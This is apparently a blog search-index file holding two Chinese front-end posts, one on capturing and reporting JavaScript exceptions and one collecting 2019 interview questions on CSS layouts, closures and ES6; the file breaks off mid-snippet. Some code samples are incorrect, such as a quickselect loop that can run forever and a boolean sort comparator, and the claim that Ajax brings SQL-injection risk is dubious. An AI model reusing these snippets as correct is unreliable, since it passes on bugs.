<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[如何优雅地处理前端异常]]></title>
    <url>%2F2019%2F08%2F11%2F%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E5%A4%84%E7%90%86%E5%89%8D%E7%AB%AF%E5%BC%82%E5%B8%B8%2F</url>
    <content type="text"><![CDATA[前端是最贴近用户的一层，随着产品的日益完善，越来越注重用户体验，前端异常就显得非常必要。 为什么要处理异常？异常是不可控的，会影响最终的呈现结果，但是我们有充分的理由去做这样的事情。1.增强用户体验；2.远程定位问题；3.未雨绸缪，及早发现问题；4.无法复现问题，尤其是移动端，机型，系统都是问题；5.完善的前端方案，前端监控系统；6.提升找错效率，提升前端代码安全性。 对于 JS 而言，我们面对的仅仅只是异常，异常的出现不会直接导致 JS 引擎崩溃，最多只会使当前执行的任务终止。 前端异常捕获与错误上报前端监控包括行为监控、异常监控、性能监控等。一个监控系统，可以分为四个阶段：日志采集、日志存储、统计与分析、报告和警告。异常采集内容 4W: WHO did WHAT and get WHICH exception in WHICH environment?浏览器信息 navigator.userAgent获取，device设备、browser浏览器、version浏览器版本、engine内核、os操作系统、Version操作系统版本、language语言 前端需要处理哪些异常？ JS 错误SyntaxError 语法错误 - 解析代码时发生的语法错误。ReferenceError 引用错误 - 引用一个不存在的变量时发生的错误。RangeError 范围错误 - 当一个值超出有效范围时发生的错误。TypeError 类型错误 - 是变量或参数不是预期类型时发生的错误。 Ajax 请求异常 静态资源加载异常 Promise 异常 Iframe 异常 跨域 script error 崩溃和卡顿 异常捕获方法 try catch在可预见情况下监控特定的错误。只能捕获到同步的运行时错误，对语法和异步错误却无能为力 window.onerror捕获预料之外的错误，全局监听异常，但不能捕获语法错误和promise的异常错误信息。最好写在所有 JS 脚本的前面，否则有可能捕获不到错误。 script error跨域时 script 加上属性crossorigin，并且服务器添加 Access-Control-Allow-Origin。 1234567891011/*** @param &#123;String&#125; message 错误信息* @param &#123;String&#125; source 出错文件* @param &#123;Number&#125; lineno 行号* @param &#123;Number&#125; colno 列号* @param &#123;Object&#125; error Error对象（对象）*/window.onerror = function(message, source, lineno, colno, error) &#123; console.log('捕获到异常：',&#123;message, source, lineno, colno, error&#125;)&#125; window.addEventListener 的 error 事件当资源（如图片或脚本）加载失败，加载资源的元素会触发一个 Event 接口的 error 事件，并执行该元素上的onerror() 处理函数。这些 error 事件不会向上冒泡到 window。 123window.addEventListener('error', (error) =&gt; &#123; console.log('捕获到异常：', error);&#125;, true) 由于网络请求异常不会事件冒泡，因此必须在捕获阶段将其捕捉到才行，但是这种方式虽然可以捕捉到网络请求的异常，但是无法判断 HTTP 的状态是 404 还是其他比如 500 等等，所以还需要配合服务端日志进行排查分析。 Promise Catch在 promise 中使用 catch 可以非常方便的捕获到异步 error window.addEventListener 的 unhandledrejection、handledrejection 事件捕获到未处理的Promise错误。没有写 catch 的 Promise 中抛出的错误无法被 onerror 或 try-catch 捕获到，为了防止有漏掉的 Promise 异常，在全局增加一个对 unhandledrejection 的监听，用来全局监听 Uncaught Promise Error。 123456window.addEventListener("unhandledrejection", function(e)&#123; e.preventDefault() // 有这行时，会去掉控制台的异常显示 console.log('捕获到异常：', e); return true;&#125;);Promise.reject('promise error'); aixos 进行拦截aixos 中使用 interceptor 进行拦截 123456789101112131415161718192021222324252627282930313233343536373839404142434445// http request 拦截器axios.interceptors.request.use(config =&gt; &#123; //loading if (store.state.user.token) &#123; config.headers['Authorization'] = store.state.user.token //每个请求都带上token // config.headers['Cookie'] = myCookie //自定义Cookie &#125; return config &#125;, err =&gt; &#123; Message.error(&#123;message: '请求超时!'&#125;); return Promise.reject(err) &#125;)//http response 拦截器axios.interceptors.response.use( response =&gt; &#123; if (response.data.code === 5555) &#123; Message.error(&#123; message: '出现非法信息: ' + response.data.illegal &#125;) return Promise.reject(response.data.description) &#125; else &#123; return response &#125; &#125;, err =&gt; &#123; if (err.response) &#123; switch (err.response.status) &#123; // 401 清除token信息并跳转到登录页面 case 401: err.message = 'Unauthorized 未授权，请重新登录' store.commit('LogOut') router.replace(&#123; path: '/login'&#125;) break case 403: err.message = 'Forbidden 服务器拒绝访问' break default: err.message = `连接错误$&#123;err.response.status&#125;` &#125; &#125; console.log(err) return Promise.reject(err) &#125;) VUE errorHandlervue 使用 Vue.config.errorHandler 捕获全局异常 123456Vue.config.errorHandler = (err, vm, info) =&gt; &#123; console.error('通过vue errorHandler捕获的错误'); console.error(err); console.error(vm); console.error(info);&#125; React 异常捕获React 16 提供了一个内置函数 componentDidCatch，使用它可以非常简单的获取到 react 下的错误信息 123componentDidCatch(error, info) &#123; console.log(error, info);&#125; 此外，UI 的某部分引起的 JS 错误不应该破坏整个程序，React16 提出了错误边界（error boundary)的新观念。但不会捕捉 事件处理器、异步代码、服务端的渲染代码、在 error boundaries 区域内的错误。 123456789101112131415161718192021222324class ErrorBoundary extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; hasError: false &#125;; &#125; componentDidCatch(error, info) &#123; this.setState(&#123; hasError: true &#125;); // Display fallback UI logErrorToMyService(error, info); // 将异常信息上报给服务器 &#125; render() &#123; if (this.state.hasError) &#123; return &lt;h1&gt;Something went wrong.&lt;/h1&gt;; &#125; return this.props.children; &#125;&#125;// 像使用普通组件那样使用&lt;ErrorBoundary&gt; &lt;MyWidget /&gt;&lt;/ErrorBoundary&gt; componentDidCatch() 方法像 JS 的 catch{} 模块一样工作，但是对于组件，只有 class 类型的组件(class component )可以成为一个 error boundaries。实际上，大多数情况下我们可以在整个程序中定义一个 error boundary 组件，之后就可以一直使用它了！ iframe 异常对于 iframe 的异常捕获，我们还得借力 window.onerror 1234567&lt;iframe src="./iframe.html" frameborder="0"&gt;&lt;/iframe&gt;&lt;script&gt; window.frames[0].onerror = function (message, source, lineno, colno, error) &#123; console.log('捕获到 iframe 异常：',&#123;message, source, lineno, colno, error&#125;); return true; &#125;;&lt;/script&gt; script errorscript error跨域时 script 加上属性crossorigin=’anonymous’，并且服务器添加 Access-Control-Allow-Origin。 sourceMap将代码压缩发布的代码，无法找到原始报错位置。在webpack中的devtool开启sourceMap功能追踪错误，将异常信息提交到 node 中间层处理分析，解析map文件后将数据传给后台服务器。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// 中间层代码const express = require('express');const fs = require('fs');const router = express.Router();const fetch = require('node-fetch');const sourceMap = require('source-map');const path = require('path');const resolve = file =&gt; path.resolve(__dirname, file);// 定义post接口router.post('/errorMsg/', function(req, res) &#123; let error = req.body; // 获取前端传过来的报错对象 let url = error.scriptURI; // 压缩文件路径 if (url) &#123; let fileUrl = url.slice(url.indexOf('client/')) + '.map'; // map文件路径 // 解析sourceMap let smc = new sourceMap.SourceMapConsumer(fs.readFileSync(resolve('../' + fileUrl), 'utf8')); // 返回一个promise对象 smc.then(function(result) &#123; // 解析原始报错数据 let ret = result.originalPositionFor(&#123; line: error.lineNo, // 压缩后的行号 column: error.columnNo // 压缩后的列号 &#125;); let url = ''; // 上报地址 // 将异常上报至后台 fetch(url, &#123; method: 'POST', headers: &#123; 'Content-Type': 'application/json' &#125;, body: JSON.stringify(&#123; errorMessage: error.errorMessage, // 报错信息 source: ret.source, // 报错文件路径 line: ret.line, // 报错文件行号 column: ret.column, // 报错文件列号 stack: error.stack // 报错堆栈 &#125;) &#125;).then(function(response) &#123; return response.json(); &#125;).then(function(json) &#123; res.json(json); &#125;); &#125;) &#125;&#125;);module.exports = router; 崩溃和卡顿利用 window 对象的 load 和 beforeunload 事件实现了网页崩溃的监控。 12345678910111213141516window.addEventListener('load', function () &#123; sessionStorage.setItem('good_exit', 'pending'); setInterval(function () &#123; sessionStorage.setItem('time_before_crash', new Date().toString()); &#125;, 1000); &#125;); window.addEventListener('beforeunload', function () &#123; sessionStorage.setItem('good_exit', 'true'); &#125;); if(sessionStorage.getItem('good_exit') &amp;&amp; sessionStorage.getItem('good_exit') !== 'true') &#123; // insert crash logging code here ... alert('Hey, welcome back from your crash, looks like you crashed on: ' + sessionStorage.getItem('time_before_crash')); &#125; Service Worker可以使用 Service Worker 来实现网页崩溃的监控。 Service Worker 有自己独立的工作线程，与网页区分开，网页崩溃了，Service Worker 一般情况下不会崩溃；Service Worker 生命周期一般要比网页还要长，可以用来监控网页的状态；网页可以通过 navigator.serviceWorker.controller.postMessage API 向掌管自己的 SW 发送消息。 基于以上几点，可以实现一种基于心跳检测的监控方案。 错误上报 ajax传递给接口因为 Ajax 请求本身也有可能会发生异常，而且有可能会引发跨域问题，一般情况下更推荐使用动态创建 img 标签的形式进行上报。 动态创建 img 标签new Image().src=reportUrl?logs=error 的方式进行上报1234567891011function report(error) &#123; let reportUrl = 'http://supremeyh/web/report'; new Image().src = `$&#123;reportUrl&#125;?logs=$&#123;error&#125;`;&#125;Reporter.send = function(data) &#123; // 设置采集率，减缓服务器的压力 if(Math.random() &lt; 0.3) &#123; send(data) // 上报错误信息 &#125;&#125; 节流当数据量变大的时候，当一个异常一段时间内不断触发，那么上报的日志会造成数据冗余，也造成流量浪费。所以，对于错误信息的上报，从上报内容和上报频率上，应该加以限制。1、限制上报：不是所有的错误都上报。设置采集率，添加黑白名单，或者添加过滤条件，满足条件的的才上报。2、合并上报：一段时间内统一的错误汇总上报，减少请求。3、服务端限制：客户端的东西总是可以绕开，服务端需要做限制，防止被攻击，或者负载过高。]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你问我答 真题]]></title>
    <url>%2F2019%2F08%2F04%2FReview%2F%E4%BD%A0%E9%97%AE%E6%88%91%E7%AD%94-%E7%9C%9F%E9%A2%98%2F</url>
    <content type="text"><![CDATA[容联 什么是盒模型，盒模型都由什么组成页面渲染时，dom 元素所采用的 布局模型。可通过box-sizing进行设置。包含了元素内容（content）、内边距（padding）、边框（border）、外边距（margin）几个要素。IE模型，box-sizing 为 border-box，content = width + padding + border标准模型，box-sizing 为 content-box，content = width 原生 js 如何 添加和移除 dom 元素element.appendChild(aChild);parentNode.insertBefore(newNode, referenceNode) node.removeChild(child) CSS Hack，有哪些形式针对不同的浏览器及版本去写不同的CSS样式，从而让各浏览器能达到一致的渲染效果 有3种表现形式，选择器前缀法、css属性前缀法、IE条件注释法1234567891011121314151617181920212223242526272829303132333435363738/* 选择器前缀法 *//* *html *前缀只对IE6生效*+html *+前缀只对IE7生效@media screen\9&#123;...&#125;只对IE6/7生效@media \0screen &#123;body &#123; background: red; &#125;&#125;只对IE8有效@media \0screen\,screen\9&#123;body &#123; background: blue; &#125;&#125;只对IE6/7/8有效@media screen\0 &#123;body &#123; background: green; &#125;&#125; 只对IE8/9/10有效@media screen and (min-width:0\0) &#123;body &#123; background: gray; &#125;&#125; 只对IE9/10有效@media screen and (-ms-high-contrast: active), (-ms-high-contrast: none) &#123;body &#123; background: orange; &#125;&#125; 只对IE10有效 *//* css属性前缀法 *//* “-″减号是IE6专有的hack“\9″ IE6/IE7/IE8/IE9/IE10都生效“\0″ IE8/IE9/IE10都生效，是IE8/9/10的hack“\9\0″ 只对IE9/IE10生效，是IE9/10的hack */.hack &#123;background-color:red; /* All browsers */ background-color:blue !important;/* All browsers but IE6 */ *background-color:black; /* IE6, IE7 */ +background-color:yellow;/* IE6, IE7*/ background-color:gray\9; /* IE6, IE7, IE8, IE9, IE10 */ background-color:purple\0; /* IE8, IE9, IE10 */ background-color:orange\9\0;/*IE9, IE10*/ _background-color:green; /* Only works in IE6 */ *+background-color:pink; /* WARNING: Only works in IE7 ? Is it right? */&#125;/* IE条件注释法 */&lt;!--[if gte IE 6]&gt; 这段文字只在IE6及以上浏览器显示&lt;![endif]--&gt; 事件委托概念：利用事件冒泡，只指定一个事件处理程序，就可以管理某一类型的所有事件 原理：事件流分为捕获、目标、冒泡3个阶段。事件开始时由嵌套层次最深的节点开始接收，然后逐级向其父级节点传播。 优点：减少与dom的交互次数，提高代码性能。动态生成DOM元素时，可通过事件代理给新增的元素添加事件函数。 适用：适合用事件委托的事件 click，mousedown，mouseup，keydown，keyup，keypress。 局限性：事件必须冒泡，如focus、blur本身就没用冒泡的特性。mouseover和mouseout虽然也有事件冒泡，但要经常计算它们的位置，处理起来不太容易。 ajax 原理、使用、缺点一种创建交互式网页应用的开发技术，通过 XMLHttpRequest 对象，在不刷新整个页面的情况下，使用异步方式与服务器发通信，获得数据，然后用 js 来操作DOM而更新页面。缺点是破坏浏览器的机制，如 back、history功能；存在 SQL 注入的安全问题。 1234567891011121314151617181920212223function ajax() &#123; var xhr; //非IE浏览器创建 xhr 对象 if (window.XMLHttpRequest) &#123; xhr = new XMLHttpRequest(); &#125; else if (window.ActiveXObject) &#123; //IE浏览器创建 xhr 对象 xhr = new ActiveXObject(); &#125; xhr.open("POST", url, false); // 同步 false, 异步 true // xhr.open("GET", url); xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded"); // post请求一定要设置请求头的格式内容 xhr.onreadystatechange = function () &#123; if (xhr.readyState == 4) &#123; if (xhr.status == 200) &#123; console.log(xhr.responseText) &#125; &#125; &#125; xhr.send(data); // xhr.send();&#125; 返回一组数中最小的K个 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// 方法一 sortlet largest = (arr, n) =&gt; arr.sort((a,b) =&gt; a &lt; b).slice(0, n);// 方法二 快速排序//交换数组元素的值function swap(arr, i, j) &#123; var temp = arr[i]; arr[i] = arr[j]; arr[j] = temp;&#125;function partation(arr, start, end) &#123; var pivot = arr[end]; // 设置哨兵 var i = start; // 交换的次数+1 哨兵要在数组插入的位置 for (var j = start; j &lt; end; j++) &#123; if (arr[j] &lt; pivot) &#123; swap(arr, i, j); i++; &#125; &#125; swap(arr, i, end); return i;&#125;function getLeastNumbers(input, k) &#123; var result = []; if (input.length &lt; 0 || k &gt; input.length || k &lt;= 0) &#123; return false; &#125; var start = 0; var end = input.length - 1; var p = partation(input, start, end); while (p !== (k - 1)) &#123; if (p &gt; (k - 1)) &#123; end = p - 1; p = partation(input, start, end); &#125; else &#123; start = p + 1; partation(input, start, end); &#125; &#125; for (var i = 0; i &lt; k; i++) &#123; result.push(input[i]); &#125; return result;&#125; 环球恒通 设置元素浮动 改元素的display都为 block JS延迟加载的几种方式defer 页面加载和解析完毕之后，按照原本的顺序执行，同时会在 DOMContentLoaded 之前执行async 脚本下载结束之后立刻执行，同时会在load 事件之前执行动态创建DOMjQuery的getScript()方法setTimeout放到页面底部让js最后引入 DOMContentLoaded 和 load 区别HTML文档被加载和解析完成，此时会触发DOMContentLoaded事件页面上所有的资源被加载以后才会触发load事件因此，页面的load事件会在DOMContentLoaded被触发之后才触发 link 与 @import 的区别link功能较多，可以定义 rss、定义 rel 等作用，@import只能用于加载 css当解析到link时，页面会同步加载所引的 css， @import所引用的 css 会等到页面加载完才被加载link可以使用 js 动态引入，@import不行@import需要 IE5 以上才能使用 方直科技 2019.8.7 offsetWidthclientWidth，可视区宽度 clientWidth = width+paddingoffsetWidth，实际宽度 offsetWidth = width+padding+border+(竖直方向滚动条)scrollWidth，实际内容宽度 scrollWidth = width+padding+(超出显示范围的滚动宽度), 无滚动时等于 clientWidth 头部底部固定，中间自适应铺满屏幕剩余高度，中间盒子里左盒子固定右盒子自适应宽度 123456&lt;div class="head"&gt;顶部&lt;/div&gt;&lt;div class="content"&gt; &lt;div class="one"&gt;左盒子 高度自适应 固定宽度200px&lt;/div&gt; &lt;div class="two"&gt;右盒子 高度自适应 宽度自适应铺满屏幕剩余高度&lt;/div&gt;&lt;/div&gt;&lt;div class="foot"&gt;底部&lt;/div&gt; 方法一、absolute 绝对定位head、foot 绝对定位，且分别top、bottom为0，宽度100%自适应父容器content 绝对定位，top值为head的高度，bottom值为foot的高度one 左浮动，宽度固定； two 左边距为one宽度 方法二：利用boxsizing改变盒子模型先为 html 设定box-sizing为border-box，加上上下padding值。布局模块均采用position:relative定位。头部采用负向margin向上平移（因为有了html padding） 方法三、 flex ES6中常用的新特性1、块级作用域 const和let2、模板字符串3、箭头函数。 不需要 function 关键字创建函数；省略 return 关键字；没有自己的this，this指向固定，就是定义(生效)时所在的对象，而不是使用时所在的对象。4、参数处理。参数默认/Rest参数/Spread。 迭代器中是一个 Spread 操作符；被用于函数传参时，是一个 Rest 操作符5、元编程。 代理Proxy/反射Reflex6、原有字面量加强 二进制和八进制字面量。 二进制使用 0b 或者 0B；数字前面添加 0o 或者0O 即可将其转换为八进制值7、对象属性加强8、对象和数组解构赋值。 如 const { name, age } = student9、新增数据类型 Map/Set/Symbol10、for…of 迭代11、ES6中的类 Class。 extends/super/重写构造器12、Module（模块）13、Promise14、尾递归优化(某个函数的最后一步是调用另一个函数,只保留内层函数的调用记录,节省内存) 蘑菇云 2019.8.8模块化算法 货拉拉 2019.8.13 压力面试 class vs interface接口（Interfaces）是对类的一部分行为进行抽象，可以用于对 对象的形状 Shape 进行描述。接口具体如何行动需要由类（classes）去实现（implement）一个类只能继承自另一个类，有时候不同类之间可以有一些共有的特性，这时候就可以把特性提取成接口（interfaces），用 implements 关键字来实现。 极光 2019.8.14依赖注入 oppo 2019.8.15 vue 双向绑定原理 react vuex 如何实现vue router WebViewAndroid WebView在Android平台上是一个特殊的View， 基于webkit引擎、展现web页面的控件，这个类可以被用来在app中仅仅显示一张在线的网页，还可以用来开发浏览器。WebView内部实现是采用渲染引擎来展示view的内容，提供网页前进后退，网页放大，缩小，搜索。Android的Webview在低版本和高版本采用了不同的webkit版本内核，4.4后直接使用了Chrome。 现在很多APP都内置了Web网页，比如电商平台。WebView比较灵活，不需要升级客户端，只需要修改网页代码即可。一些经常变化的页面可以用WebView这种方式去加载网页。 Webview功能强大，可以直接使用html文件（本地sdcard/assets目录），还可以直接加载url，使用JavaScript可以html跟原生APP互调。 快应用快应用也叫免安装应用，即点即用。应用使用前端技术栈开发，原生渲染，同时具备H5页面和原生应用的双重优点。快应用是华为小米等联合狙击微信小程序开发的平台，快应用比微信小程序更进一步的是，使用native渲染而不是webview渲染。 TX 2019.8.20 自我介绍 最近的项目 vue react 对比 virtual dom vuex 小程序 双向绑定 csrf 产生 预防 性能优化 缓存 cache-control 代理服务器 css 动画 懒加载 图片 img的src为空或者#，都会发一次请求，浏览器会用当前路径发起一次请求。直接改为 img flex 使得所有列包括两边间距一样 ES6 Vue3 新特性更快、更小、更易于维护、更多的原生支持、更易于开发使用1、虚拟 DOM 重写，mounting和patching的速度提高100％2、更多的编译时的提示来减少运行时的开销3、组件快速路径+单个调用+子类型检测。 跳过不必要的条件分支、JS引擎更容易优化4、优化插槽的生成。 确保实例正确的跟踪依赖关系、避免不必要的父子组件重新渲染5、静态树提升6、静态属性提升7、内联的事件提升8、基于Proxy的观察者机制，全语言覆盖+更好的性能 追一科技 2019.8.10IP 正则 (\d{1,3}.){3}\d{1,3}虚拟dom的实现双向绑定 明源云 2019.8.14 写出下面代码执行结果 123456789101112131415161718192021222324// 一 var a = 3function change1(a) &#123; a = 4&#125;change1(a)console.log(a) // 3// 二var user = &#123;age: 30&#125;function change2(user) &#123; user.age = 40&#125;change2(user)console.log(user.age) // 40// 三function change3(user) &#123; user = &#123;age: 50&#125;&#125;change3(user)console.log(user.age) // 40 三栏布局，两边固定，中间自适应 float实现基于纯float实现的三栏布局需要将中间的内容放在HTML结构的最后，否则右侧会沉在中间内容的下侧原理：元素浮动后，脱离文档流，后面的元素受浮动影响，设置受影响元素的margin值即可 1234567891011121314151617181920212223242526272829&lt;div class="wrap"&gt; &lt;div class="left"&gt;&lt;/div&gt; &lt;div class="right"&gt;&lt;/div&gt; &lt;div class="middle"&gt;&lt;/div&gt;&lt;/div&gt;&lt;style&gt; .wrap&#123; overflow: hidden; height: 400px; &#125; .left, .right &#123; width: 200px; height: 100%; &#125; .left&#123; float: left; background: #00f; &#125; .right&#123; float: right; background: #0f0; &#125; .middle&#123; width: 100%; height: 100%; background: #f00; &#125;&lt;/style&gt; 圣杯布局三栏利用 float 和 负margin 并列，利用父容器设置 padding 给两边侧栏腾空间先给这三个div都给一个float: left，让它们均左浮动设置左盒子的margin-left: -100%，把左盒子拉上来，调整左盒子的浮动位置到中间盒子的左侧设置右盒子的margin-left: -右盒子宽度px，把右盒子拉上来，调整右盒子的浮动位置到中间盒子的右侧设置左右盒子position: relative，分别设置left和right，并且控制父元素的padding来为左右两边留白。中间盒子的左右两侧会被左右两个盒子覆盖，通过相对定位来避免覆盖 12345678910111213141516171819202122232425262728293031323334353637383940&lt;div class="wrap"&gt; &lt;div class="middle"&gt;&lt;/div&gt; &lt;div class="left"&gt;&lt;/div&gt; &lt;div class="right"&gt;&lt;/div&gt;&lt;/div&gt;&lt;style&gt; .wrap&#123; overflow: hidden; height: 400px; width: 100%; padding: 0 200px 0 100px; &#125; .left, .right, .middle &#123; float: left; &#125; .left&#123; width: 100px; height: 100%; background: #00f; margin-left: -100%; position: relative; left: -100px; &#125; .right&#123; width: 200px; height: 100%; background: #0f0; margin-left:-200px; position: relative; right: -200px; &#125; .middle&#123; width: 100%; height: 100%; background: #f00; &#125;&lt;/style&gt; 双飞翼布局三栏利用 float 和 负margin 并列，在中间栏加一层容器，利用 margain 给两栏腾空间 12345678910111213141516171819202122232425262728293031323334353637383940&lt;div class="wrap"&gt; &lt;div class="middle"&gt; &lt;div class="inner"&gt;pppp&lt;/div&gt; &lt;/div&gt; &lt;div class="left"&gt;&lt;/div&gt; &lt;div class="right"&gt;&lt;/div&gt; &lt;/div&gt; &lt;style&gt; .wrap&#123; overflow: hidden; height: 400px; width: 100%; &#125; .left, .right, .middle &#123; float: left; &#125; .left&#123; width: 100px; height: 100%; background: #00f; margin-left: -100%; &#125; .right&#123; width: 200px; height: 100%; background: #0f0; margin-left: -200px; &#125; .middle&#123; width: 100%; height: 100%; background: #f00; &#125; .inner&#123; margin: 0 200px 0 100px; background: #ff0; &#125; &lt;/style&gt; absolute基于绝对定位的三栏布局：注意绝对定位的元素脱离文档流，相对于最近的已经定位的祖先元素进行定位。无需考虑HTML中结构的顺序，niddle 可放在开头、中间或结尾缺点：有顶部对齐问题，需要进行调整，注意中间的高度为整个内容的高度 1234567891011121314151617181920212223242526272829303132&lt;div class="wrap"&gt; &lt;div class="middle"&gt;&lt;/div&gt; &lt;div class="left"&gt;&lt;/div&gt; &lt;div class="right"&gt;&lt;/div&gt; &lt;/div&gt; &lt;style&gt; .wrap&#123; overflow: hidden; height: 400px; &#125; .left, .right &#123; width: 200px; height: 100%; position: absolute; top: 0; &#125; .left&#123; background: #00f; left: 0; &#125; .right&#123; background: #0f0; right: 0; &#125; .middle&#123; height: 100%; background: #f00; left: 200px; right: 200px; margin: 0 200px; &#125; &lt;/style&gt; flex 123456789101112131415161718192021222324252627&lt;div class="wrap"&gt; &lt;div class="left"&gt;&lt;/div&gt; &lt;div class="middle"&gt;&lt;/div&gt; &lt;div class="right"&gt;&lt;/div&gt;&lt;/div&gt;&lt;style&gt; .wrap&#123; display: flex; height: 400px; flex-direction: row; justify-content: space-between; &#125; .left, .right &#123; width: 200px; height: 100%; &#125; .left&#123; background: #00f; &#125; .right&#123; background: #0f0; &#125; .middle&#123; height: 100%; background: #f00; flex: auto; &#125; 3、写出弹框显示内容，都会有三次弹框1234567891011121314151617181920function test(a,b) &#123; alert(b) return &#123; test: function(c, a) &#123; return test(c, a) &#125; &#125;&#125;// 一var a = test(100,200) // 200a.test(300) // undefineda.test(300) // undefined// 二var b = test(101).test(201).test(401) // undefined undefined undefined// 三var c = test(102).test(201, 302) // undefined 302c.test() // undefined 4、 设置 a 的值让条件 a == 2 &amp;&amp; a == 3 成立123456789101112131415// 方法一var a = &#123; i: 2, toString() &#123; return a.i++ &#125;&#125;// 方法二var i = 1Object.defineProperty(window, 'a', &#123; get: function() &#123; return ++i; &#125;&#125;); 5、不使用for 或 while，创建一个长度100的数组，并且每个元素的值等于它的下标注意陷阱 map、forEach 不会跳过undefined和null，但是会跳过空位123456789// 创建一个空的密集数组最正确姿势var arr = Array.from(&#123;length: 100&#125;)var arr = [...Array(100)]var arr = Array.apply(null, &#123;length: 100&#125;) // 不能用 callvar arr = Object.keys(Array.apply(null,&#123;length:100&#125;))var arr = Array.apply(null, &#123;length: 100&#125;).map(Number.call, Number) var arr = new Array(100).fill("").map(function(v,i)&#123;return i&#125;) 6、 将扁平的数据转为树形结构1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// 原始 list 如下let list =[ &#123;id:1, parentId:0, value: 'a'&#125;, &#123;id:2, parentId:1, value: 'b'&#125;, &#123;id:3, parentId:1, value: 'c'&#125;, &#123;id:4, parentId:1, value: 'd'&#125;, &#123;id:5, parentId:2, value: 'e'&#125;, &#123;id:6, parentId:3, value: 'f'&#125;, &#123;id:7, parentId:2, value: 'g'&#125;, &#123;id:8, parentId:4, value: 'h'&#125;];// 转换成 parentId 为键的对象 function buildTree(list)&#123; let temp = &#123;&#125;; let tree = &#123;&#125;; for(let i in list)&#123; temp[list[i].id] = list[i]; &#125; for(let i in temp)&#123; if(temp[i].parentId) &#123; if(!temp[temp[i].parentId].children) &#123; temp[temp[i].parentId].children = new Object(); &#125; temp[temp[i].parentId].children[temp[i].id] = temp[i]; &#125; else &#123; tree[temp[i].id] = temp[i]; &#125; &#125; return tree;&#125;// 转换成 内嵌children 的对象数组function convert(list) &#123; const res = [] const map = list.reduce((res, v) =&gt; (res[v.id] = v, res), &#123;&#125;) for (const item of list) &#123; if (item.parentId === 0) &#123; res.push(item) continue &#125; if (item.parentId in map) &#123; const parent = map[item.parentId] parent.children = parent.children || [] parent.children.push(item) &#125; &#125; return res&#125; 大疆 2019.8.21react 生命周期高阶组件 TCL 2019.8.21 null instanceof Object、{a:1} instanceof nullfalse、 error(Right-hand side of ‘instanceof’ is not an object) 变量提升函数及变量的声明都将被提升到函数的最顶部；变量可以在使用后声明（变量赋值不会提升，有多个函数声明的时候，是由最后面的函数声明来替代前面的；函数提升的优先级大于变量提升的优先级，即函数提升在变量提升之上 123456789101112131415161718192021222324252627282930313233var name = 'aa';(function() &#123; if(typeof name==='undefined') &#123; var name = 'bb' console.log(name) &#125; else &#123; console.log(name) &#125;&#125;)()// 相当于var name = 'aa';(function() &#123; var name if(typeof name==='undefined') &#123; name = 'bb' console.log(name) &#125; else &#123; console.log(name) &#125;&#125;)()// 改动var name = 'aa';(function() &#123; if(typeof name==='undefined') &#123; name = 'bb' console.log(name) &#125; else &#123; console.log(name) &#125;&#125;)()// aa 作用域 123456789101112131415161718192021222324for(var i=0; i&lt;3; i++) &#123; setTimeout(() =&gt; &#123; console.log(i) &#125;, 0);&#125;// 3 3 3// 改动for(var i=0; i&lt;=3; i++) &#123; setTimeout(() =&gt; &#123; console.log(i) &#125;, 0);&#125;// 4, 4, 4, 4// 改动for(let i=0; i&lt;3; i++) &#123; setTimeout(() =&gt; &#123; console.log(i) &#125;, 0);&#125;// 0, 1, 2 数组非变异方法变异方法: push/pop/shift/unshift/sort/splice/reverse非变异方法: concat/slice/join; map/find/forEach/filter 12345var a1 = [1, 3, 2]var a2 = [4, 5]a1.concat(a2)a1.sort()console.log(a1) // [1, 2, 3] 鼠标点击页面中的任意标签，弹出该标签名 1234567document.onclick = function(eve) &#123; var e = eve || window.event var o = e.target || e.srcElement alert(o.tagName)&#125;// 注意: e.target 当前实际点击触发的节点， e.currentTarget 事件委托者 标签弹出其索引值 1234567891011121314151617181920212223242526var oli = document.getElementsByTagName('li')// 方法一// 根据作用域的工作原理，尽管循环中的6个函数是在各个迭代中分别定义的，运行时都会捕获一个i的副本，但是他们都被封闭在一个共享的全局作用域中，因此实际上只有一个ifor(var i=0; i&lt;oli.length; i++) &#123; oli[i].index = i oli[i].onclick = function() &#123; alert(index) &#125;&#125;// 方法二 闭包// 在迭代内使用IIFE会为每一个迭代都生成一个新的作用域，使得点击函数可以将新的作用域封闭在每个迭代内部，每个迭代中都会含有一个具有正确值的变量供我们访问for(var i=0; i&lt;oli.length; i++) &#123; (function(n) &#123; oli[i].onclick = funtion() &#123; alert(n) &#125; &#125;)(i)&#125;// 方法二 ES6// for循环头部的let声明会有一个特殊的行为，变量在循环过程中不止被声明一次，每次迭代都会声明，随后的每个迭代都会用上一个迭代结束时的值来初始化这个变量'use strict'for(let i=0; i&lt;oli.length; i++) &#123; oli[i].onclick = function() &#123; alert(i) &#125;&#125; Http 状态码1 信息，服务器收到请求，需要请求者继续执行操作2 成功，操作被成功接收并处理3 重定向，需要进一步的操作以完成请求4 客户端错误5** 服务器错误 携程 2019.8.27工作团队 规模 选型 开发规范如何与后端交互vue vue-router vuexreact react-router-dom reduxvue 组价传值react 生命周期rnxhr继承箭头函数的特点async await 实现 promise.all() 并行css2 BFCcss3 画圆角、动画flex 居中跨域数据结构二叉树 无子节点即结束队列、堆栈设计模式常见排序算法、时间复杂度、稳定性 京东 2019.8.28笔试题 var/let/const 区别 css 选择器 尽可能多的写出 让div水平垂直居中 实现千分位分隔符(尽可能用正则)，如 1000 展示位 1,000分析：– 从后往前每三个数字加一个逗号– 如果恰好是3的倍数个数字，最前面不需要逗号– 由于强制逗号后面必须跟3位数字，可能需要用到零宽断言找到符合条件的位置零宽度正预测先行断言 (?=exp) 断言自身出现的位置的后面能匹配表达式exp，如 (?=ing) 查找 dacing 时 匹配dacstr.repalce(/(\d)(?=(\d{3})+$)/g,’$1,’) 给定一个包含超过两个数字的数组，实现去重、按最后一个元素对称复制、求和变异方法: push/pop/shift/unshift/sort/splice/reverse非变异方法: concat/slice/join; map/find/forEach/filter 1234567891011var a = [1, 1, 2, 3]var b = [...new Set(a)] // [1, 2, 3]var c = b.slice(0, -1) // [1, 2]var c1 = c.reverse() // [2, 1]var d = b.concat(c1) // [1, 2, 3, 